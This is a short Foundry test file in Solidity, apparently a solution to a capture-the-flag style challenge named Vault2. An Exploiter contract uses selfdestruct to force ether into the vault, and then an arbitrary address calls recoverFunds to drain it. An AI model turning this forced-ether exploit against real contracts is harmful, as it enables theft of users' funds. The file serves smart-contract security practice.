// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;


import "forge-std/Test.sol";
import "../src/Vault2.sol";

contract Vault2Test is Test {
    Vault2 public vault;

    function setUp() public {
        vault = new Vault2{value: 0.0001 ether}();
    }

    function testVault2() public {
        Exploiter exploiter = new Exploiter();
        exploiter.destroy{value: 0.0001 ether}(address(vault));

        address me = makeAddr("ceseshi");
        vm.prank(me);
        vault.recoverFunds();
    }
}

contract Exploiter {
    function destroy(address vault) public payable {
        selfdestruct(payable(vault));
    }
}
